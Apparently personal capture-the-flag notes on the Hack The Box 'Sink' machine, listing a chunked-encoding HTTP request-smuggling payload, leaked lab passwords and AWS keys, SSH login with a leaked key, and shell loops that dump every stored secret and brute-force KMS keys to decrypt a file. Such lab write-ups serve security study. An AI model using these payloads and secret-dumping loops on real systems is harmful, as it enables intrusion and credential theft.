### Write ups
* https://chr0x6eos.github.io/2021/09/18/htb-Sink.html
* https://0xdedinfosec.github.io/posts/htb-sink/
* https://0xdf.gitlab.io/2021/09/18/htb-sink.html

### Make the chunked working
Add zero before the second request due to rfc like serialized format. In order to send multiple data in one packet on differenct tcp connections.

```burp
POST /comment HTTP/1.1
Host: 10.129.97.231:5000
Content-Length: 243
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.97.231:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.97.231:5000/home
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=eyJlbWFpbCI6ImZvb0BiYXIuY29tIn0.Y7zvZw.3_5f9jRl6XBlL7IZEy0OA7-YuY4
Transfer-Encoding:chunked

4
msg=
0

POST /notes HTTP/1.1
Host: localhost:5000
Content-Length: 300
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImZvb0BiYXIuY29tIn0.Y7zvZw.3_5f9jRl6XBlL7IZEy0OA7-YuY4

note=
```

### After gain the web admin

* Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&zEx{4]zz 

* Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3 <- this one worked

* Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : `g8<H6GK\{*L.fB3C`

### Get private key for marcus
http://10.129.97.231:3000/root/Key_Management/raw/commit/b01a6b7ed372d154ed0bc43a342a5e1203d07b1e/.keys/dev_keys

```bash
chmod 600 dev_keys
ssh marcus@10.129.97.231 -i dev_keys
```

### Get AWS key
http://10.129.97.231:3000/root/Log_Management/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba

```php
$client = new CloudWatchLogsClient([
	'region' => 'eu',
	'endpoint' => 'http://127.0.0.1:4566',
	'credentials' => [
		'key' => 'AKIAIUEN3QWCPSTEITJQ',
		'secret' => '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'
	],
	'version' => 'latest'
]);
```

### AWS Enumeration
```bash
marcus@sink:~$ aws configure
AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: EU
Default output format [None]: json
```

awslocal for shorten the command
```bash 
awslocal secretsmanager list-secrets

aws secretsmanager --endpoint-url http://127.0.0.1:4566 list-secrets
```

We get all secrets listed. In order to retrieve each secret, we need to use the ARN as secret-id for get-secret-value. We can get all ARNs by using grab and awk.

```bash
awslocal secretsmanager list-secrets | grep -oE '"ARN": "(..?*)"' | awk -F '\"' '{ print $4}'

arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-OxZiM
arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-fOAPh
arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-kHpCK
```

```bash
awslocal secretsmanager list-secrets | grep -oE '"ARN": "(..?*)"' | awk -F '\"' '{ print $4}' | while read key;
do
	echo $key; awslocal secretsmanager get-secret-value --secret-id "$key";
done
```

```json
arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-OxZiM
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-OxZiM",
    "Name": "Jenkins Login",
    "VersionId": "b026ddaf-3e3a-48f4-81a2-2717472043af",
    "SecretString": "{\"username\":\"john@sink.htb\",\"password\":\"R);\\)ShS99mZ~8j\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1673325528
}
arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-fOAPh
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-fOAPh",
    "Name": "Sink Panel",
    "VersionId": "09d6147b-877a-424f-91c8-b380f6b27e06",
    "SecretString": "{\"username\":\"albert@sink.htb\",\"password\":\"Welcome123!\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1673325528
}
arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-kHpCK
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-kHpCK",
    "Name": "Jira Support",
    "VersionId": "3064da03-4614-45c7-84c5-3c9aedcff045",
    "SecretString": "{\"username\":\"david@sink.htb\",\"password\":\"EALB=bcC=`a7f2#k\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1673325528
}
```

### su david
```bash
cat /etc/passwd | grep "/bin/.*sh"

david@sink:~/Projects/Prod_Deployment$ ls
servers.enc
```

### Enumeration Again
The Key_Management repo in Gitea has a handful of scripts. For example, `listkeys.php`

```php
    <?php
    require 'vendor/autoload.php';

    use Aws\Kms\KmsClient;
    use Aws\Exception\AwsException;

    $KmsClient = new Aws\Kms\KmsClient([
        'profile' => 'default',
        'version' => '2020-12-21',
        'region' => 'eu',
        'endpoint' => 'http://127.0.0.1:4566'
    ]);

    $limit = 100;

    try {
        $result = $KmsClient->listKeys([
            'Limit' => $limit,
        ]);
        var_dump($result);
    } catch (AwsException $e) {
        echo $e->getMessage();
        echo "\n";
    }
```

### Exploit AWS - Key Management Service
```bash
awslocal kms list-keys
```

aswlocal is better in some ways since it doesn't require confiture again.
```bash
david@sink:~/Projects/Prod_Deployment$ awslocal kms list-keys | grep KeyId | cut -d'"' -f4
0b539917-5eff-45b2-9fa1-e13f0d2c42ac
16754494-4333-4f77-ad4c-d0b73d799939
2378914f-ea22-47af-8b0c-8252ef09cd5f
2bf9c582-eed7-482f-bfb6-2e4e7eb88b78
53bb45ef-bf96-47b2-a423-74d9b89a297a
804125db-bdf1-465a-a058-07fc87c0fad0
837a2f6e-e64c-45bc-a7aa-efa56a550401
881df7e3-fb6f-4c7b-9195-7f210e79e525
c5217c17-5675-42f7-a6ec-b5aa9b9dbbde
f0579746-10c3-4fd1-b2ab-f312a5a0f3fc
f2358fef-e813-4c59-87c8-70e50f6d4f70

david@sink:~/Projects/Prod_Deployment$ aws kms --endpoint-url http://127.0.0.1:4566 list-keys | grep -oE '"KeyId": "(.?*)"' | awk -F '\"' '{ print $4 }'
You must specify a region. You can also configure your region by running "aws configure".
```

##### while do Method #1
Find the one that’s intended for `ENCRYPT_DECRYPT` and try to decrypt the blob. This key supports both SHA1 and SHA256 based RSAES:
```bash
awslocal kms list-keys | grep KeyId | cut -d'"' -f4 | while read id; do desc=$(awslocal kms describe-key --key-id $id); use=$(echo $desc | cut -d'"' -f26); echo $desc | grep -q Disabled || echo "$id  $use"; done
```

Reference the file by the notation fileb://[path], and pass it into the decrypt subcommand:
```bash
david@sink:~/Projects/Prod_Deployment$ awslocal kms decrypt --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --ciphertext-blob fileb://servers.enc --encryption-algorithm RSAES_OAEP_SHA_256
{
    "KeyId": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0",
    "Plaintext": "H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=",
    "EncryptionAlgorithm": "RSAES_OAEP_SHA_256"
}
```

##### for do Method #2
We can also brute-force every key for the encrypted file:
```bash
for key in $(awslocal kms list-keys | grep KeyId | cut -d'"' -f4);
do
	awslocal kms describe-key --key-id $key
    awslocal kms enable-key --key-id "$key"
    awslocal kms decrypt --key-id "$key" --ciphertext-blob "fileb://`pwd`/servers.enc" --encryption-algorithm "RSAES_OAEP_SHA_256" --query Plaintext --output text;
done
```

### Decrypt
It’s now gzipped data. I can decompress that with zcat, which makes a tar archive. Extracting that provides two files, and the servers.yml file is plaintext.
CyberChef also gold here with Gunzip.
```bash
echo "H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=" | base64 -d > decrypted

david@sink:~/Projects/Prod_Deployment$ ls
decrypted  servers.enc
david@sink:~/Projects/Prod_Deployment$ file decrypted 
decrypted: gzip compressed data, from Unix, original size modulo 2^32 10240
david@sink:~/Projects/Prod_Deployment$ zcat decrypted > decrypted_decompressed
david@sink:~/Projects/Prod_Deployment$ file decrypted_decompressed 
decrypted_decompressed: POSIX tar archive (GNU)
david@sink:~/Projects/Prod_Deployment$ tar xvf decrypted_decompressed
servers.yml
servers.sig
david@sink:~/Projects/Prod_Deployment$ cat servers.yml 
server:
  listenaddr: ""
  port: 80
  hosts:
    - certs.sink.htb
    - vault.sink.htb
defaultuser:
  name: admin
  pass: _uezduQ!EY5AHfe2
```
